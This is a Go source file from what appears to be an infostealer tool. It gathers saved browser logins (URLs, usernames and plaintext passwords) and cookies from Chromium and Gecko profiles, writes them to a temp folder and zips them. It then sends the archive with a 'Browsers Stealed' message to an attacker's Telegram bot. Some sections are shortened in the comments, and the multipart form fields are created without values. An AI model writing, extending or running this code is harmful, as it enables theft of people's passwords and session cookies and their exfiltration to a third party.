package browsers

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/benzoXdev/oxil/utils/fileutil"
	"github.com/benzoXdev/oxil/utils/hardware"
)

// ... (ChromiumSteal ve GeckoSteal fonksiyonlarý ayný kalýyor, deðiþtirmedim)

func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown", // Veya "HTML" istersen deðiþtir
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Telegram sendMessage failed: %d - %s", resp.StatusCode, string(body))
	}
	return nil
}

func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Caption (metin açýklamasý)
	_ , _ = writer.CreateFormField("chat_id")
	_ , _ = writer.CreateFormField("caption")
	_ , _ = writer.CreateFormField("parse_mode")

	fw, err := writer.CreateFormFile("document", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fw, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Telegram sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}

func Run(botToken string, chatID string) {
	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	var profiles []Profile
	profiles = append(profiles, ChromiumSteal()...)
	profiles = append(profiles, GeckoSteal()...)

	if len(profiles) == 0 {
		return
	}

	// Klasör yapýsýný oluþtur ve dosyalarý yaz
	for _, profile := range profiles {
		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 &&
			len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 &&
			len(profile.History) == 0 {
			continue
		}

		userDir := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name)
		os.MkdirAll(userDir, os.ModePerm)

		// Logins
		if len(profile.Logins) > 0 {
			loginsPath := filepath.Join(userDir, "logins.txt")
			fileutil.AppendFile(loginsPath, fmt.Sprintf("%-50s %-50s %-50s\n", "URL", "Username", "Password"))
			for _, login := range profile.Logins {
				fileutil.AppendFile(loginsPath, fmt.Sprintf("%-50s %-50s %-50s\n", login.LoginURL, login.Username, login.Password))
			}
		}

		// Cookies (Netscape format)
		if len(profile.Cookies) > 0 {
			cookiesPath := filepath.Join(userDir, "cookies.txt")
			for _, cookie := range profile.Cookies {
				expires := "FALSE"
				if cookie.ExpireDate != 0 {
					expires = "TRUE"
				}
				hostOnly := "FALSE"
				if !strings.HasPrefix(cookie.Host, ".") {
					hostOnly = "TRUE"
				}
				line := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s\n",
					cookie.Host, expires, cookie.Path, hostOnly, cookie.ExpireDate, cookie.Name, cookie.Value)
				fileutil.AppendFile(cookiesPath, line)
			}
		}

		// Credit Cards, Downloads, History ayný mantýkla devam eder (kod ayný kaldý)
		// ... (kýsalttým ama seninkini olduðu gibi býrakabilirsin)
	}

	// ZIP oluþtur
	tempZip := filepath.Join(os.TempDir(), "browsers.zip")
	if err := fileutil.Zip(tempDir, tempZip); err != nil {
		return
	}
	defer os.Remove(tempZip)

	// Telegram'a gönderilecek mesaj metni
	tree := fileutil.Tree(tempDir, "")
	message := fmt.Sprintf(
		"*Browsers Stealed*\n\n"+
			"```%s```\n\n"+
			"ZIP dosyasý aþaðýda ekli.",
		tree,
	)

	// 1. Metni gönder
	_ = sendTextToTelegram(botToken, chatID, message)

	// 2. ZIP dosyasýný gönder (caption ile)
	caption := "Browsers data archive"
	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
}
